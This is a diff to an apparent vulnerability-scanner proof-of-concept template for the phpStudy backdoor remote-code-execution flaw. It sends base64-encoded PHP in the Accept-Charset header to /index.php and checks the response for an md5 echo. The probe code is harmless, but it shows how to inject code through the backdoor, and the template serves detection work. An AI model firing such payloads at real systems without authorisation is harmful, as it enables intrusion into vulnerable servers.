@@ -1,13 +1,16 @@
 name: poc-yaml-phpstudy-backdoor-rce
+set:
+  r: randomLowercase(6)
+  payload: base64("printf(md5('" + r + "'));")
 rules:
   - method: GET
     path: /index.php
     headers:
       Accept-Encoding: 'gzip,deflate'
-      Accept-Charset: cHJpbnRmKG1kNSg0NTczMTM0NCkpOw==
+      Accept-Charset: '{{payload}}'
     follow_redirects: false
     expression: |
-      response.body.bcontains(b"a5952fb670b54572bcec7440a554633e")
+      response.body.bcontains(bytes(md5(r)))
 detail:
   author: 17bdw
   Affected Version: "phpstudy 2016-phpstudy 2018 php 5.2 php 5.4"
